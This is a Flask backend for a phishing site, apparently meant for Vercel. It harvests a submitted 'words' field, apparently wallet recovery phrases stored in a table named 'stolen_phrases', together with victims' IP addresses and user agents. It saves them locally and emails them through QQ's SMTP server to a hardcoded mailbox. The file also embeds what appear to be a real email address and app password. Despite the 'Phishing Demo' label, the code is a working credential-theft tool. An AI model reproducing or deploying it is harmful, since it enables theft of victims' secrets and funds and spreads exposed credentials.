from flask import Flask, request, render_template, redirect, url_for
import json
import sqlite3
import smtplib
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os

app = Flask(__name__)

# 使用临时目录存储数据，以兼容 Vercel 的无状态环境
DATA_DIR = '/tmp'
DB_PATH = os.path.join(DATA_DIR, 'phishing_data.db')
JSON_PATH = os.path.join(DATA_DIR, 'stolen_data.json')

EMAIL_SENDER = os.environ.get('EMAIL_SENDER', '79520128@qq.com')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', 'kzhkbmrjeliabgjb')
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', '79520128@qq.com')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/', methods=['POST'])
def handle_post():
    words = request.form.get('words', '')
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    print(f" Data intercepted - Words: {words}, IP: {ip}")
    
    save_to_file(words, ip, user_agent)
    save_to_db(words, ip, user_agent)
    send_email(words, ip, user_agent)
    
    return render_template('submitted.html')

def save_to_file(words, ip, user_agent):
    try:
        with open(JSON_PATH, 'r') as f:
            data = json.load(f)
    except FileNotFoundError:
        data = []
    
    data.append({
        'timestamp': datetime.now().isoformat(),
        'words': words,
        'ip': ip,
        'user_agent': user_agent
    })
    
    with open(JSON_PATH, 'w') as f:
        json.dump(data, f, indent=2)

def save_to_db(words, ip, user_agent):
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS stolen_phrases (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                words TEXT,
                ip TEXT,
                user_agent TEXT,
                status TEXT DEFAULT 'new'
            )
        ''')
        cursor.execute('''
            INSERT INTO stolen_phrases (timestamp, words, ip, user_agent)
            VALUES (?, ?, ?, ?)
        ''', (datetime.now().isoformat(), words, ip, user_agent))
        conn.commit()
    except Exception as e:
        print(f" Database error: {e}")
    finally:
        conn.close()

def send_email(words, ip, user_agent):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_SENDER
        msg['To'] = EMAIL_RECEIVER
        msg['Subject'] = f'Phishing Demo - Words Captured - {datetime.now().strftime("%Y-%m-%d %H:%M")}'
        
        body = f"""
        New phishing data captured!

        Words: {words}
        IP: {ip}
        User-Agent: {user_agent}
        Time: {datetime.now().isoformat()}
        """
        msg.attach(MIMEText(body, 'plain'))
        
        server = smtplib.SMTP('smtp.qq.com', 587)
        server.starttls()
        server.login(EMAIL_SENDER, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        print(f" Email sent to {EMAIL_RECEIVER}")
    except Exception as e:
        print(f" Email failed: {e}")

# Vercel 需要这个 'app' 实例
if __name__ == '__main__':
    app.run()